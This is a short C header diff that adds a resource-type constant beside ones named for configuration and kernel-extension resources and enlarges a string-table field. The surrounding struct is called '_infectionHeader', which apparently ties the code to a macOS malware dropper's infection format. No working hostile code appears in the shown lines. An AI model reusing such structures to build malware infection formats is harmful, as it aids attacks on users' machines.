@@ -41,6 +41,7 @@
 #define RESOURCE_CONF       0x0001
 #define RESOURCE_KEXT       0x0002
 #define RESOURCE_IN_MANAGER 0x0003
+#define RESOURCE_ICON       0x0004
 
 typedef struct _infectionHeader
 {
@@ -52,7 +53,7 @@ typedef struct _infectionHeader
 
 typedef struct _strings
 {
-  char value[8];
+  char value[13];
   int type;
 } stringTable;
 
